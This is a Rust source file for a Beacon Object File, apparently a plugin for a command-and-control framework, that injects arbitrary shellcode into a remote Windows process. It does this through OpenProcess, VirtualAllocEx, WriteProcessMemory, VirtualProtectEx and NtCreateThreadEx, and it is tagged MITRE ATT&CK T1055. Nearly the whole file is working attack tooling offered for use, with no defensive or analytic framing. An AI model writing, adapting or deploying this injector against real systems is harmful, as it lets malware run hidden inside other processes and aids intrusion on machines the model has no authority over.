//! # NtCreateThreadEx Injection BOF
//!
//! Injects shellcode into a remote process using the
//! `OpenProcess` -> `VirtualAllocEx` -> `WriteProcessMemory` ->
//! `VirtualProtectEx` -> `NtCreateThreadEx` technique.
//! ## MITRE ATT&CK
//! - T1055 - Process Injection
//!
//! ## Arguments
//! - `int`: Target process ID (PID).
//! - `bin`: Shellcode to inject (binary data).

#![no_std]

use core::ptr::null_mut;
use rustbof::data::DataParser;
use rustbof::{eprintln, println};
use windows_sys::Win32::Foundation::{CloseHandle, FALSE, GetLastError};
use windows_sys::Win32::System::Diagnostics::Debug::WriteProcessMemory;
use windows_sys::Win32::System::Memory::{
    MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ, PAGE_READWRITE, VirtualAllocEx, VirtualProtectEx,
};
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

const THREAD_ALL_ACCESS: u32 = 0x1FFFFF;

unsafe extern "system" {
    fn NtCreateThreadEx(
        thread_handle: *mut *mut core::ffi::c_void,
        desired_access: u32,
        object_attributes: *mut core::ffi::c_void,
        process_handle: *mut core::ffi::c_void,
        start_routine: *mut core::ffi::c_void,
        argument: *mut core::ffi::c_void,
        create_suspended: u32,
        zero_bits: usize,
        stack_size: usize,
        maximum_stack_size: usize,
        attribute_list: *mut core::ffi::c_void,
    ) -> i32;
}

#[rustbof::main]
fn main(args: *mut u8, len: usize) {
    let mut parser = DataParser::new(args, len);

    let pid = parser.get_int() as u32;
    let shellcode = parser.get_bytes();
    let sc_len = shellcode.len();

    println!("ntcreatethread:");
    println!("  pid:      {}", pid);
    println!("  sc_len:   {} bytes", sc_len);

    let process = unsafe { OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid) };
    if process.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("OpenProcess failed ({:#X})", err);
        return;
    }

    let remote_addr = unsafe {
        VirtualAllocEx(
            process,
            null_mut(),
            sc_len,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        )
    };
    if remote_addr.is_null() {
        let err = unsafe { GetLastError() };
        eprintln!("VirtualAllocEx failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }
    println!("  remote:   {:#X}", remote_addr as usize);

    let result = unsafe {
        WriteProcessMemory(
            process,
            remote_addr,
            shellcode.as_ptr() as *const core::ffi::c_void,
            sc_len,
            null_mut(),
        )
    };
    if result == FALSE {
        let err = unsafe { GetLastError() };
        eprintln!("WriteProcessMemory failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }

    let mut old_protect: u32 = 0;
    let result = unsafe {
        VirtualProtectEx(
            process,
            remote_addr,
            sc_len,
            PAGE_EXECUTE_READ,
            &mut old_protect,
        )
    };
    if result == FALSE {
        let err = unsafe { GetLastError() };
        eprintln!("VirtualProtectEx failed ({:#X})", err);
        unsafe { CloseHandle(process) };
        return;
    }

    let mut thread: *mut core::ffi::c_void = null_mut();
    let status = unsafe {
        NtCreateThreadEx(
            &mut thread,
            THREAD_ALL_ACCESS,
            null_mut(),
            process,
            remote_addr,
            null_mut(),
            FALSE as u32,
            0,
            0,
            0,
            null_mut(),
        )
    };
    if status != 0 {
        eprintln!("NtCreateThreadEx failed (NTSTATUS {:#X})", status);
        unsafe { CloseHandle(process) };
        return;
    }

    println!("SUCCESS - remote thread created via NtCreateThreadEx.");

    unsafe {
        CloseHandle(thread);
        CloseHandle(process);
    }
}
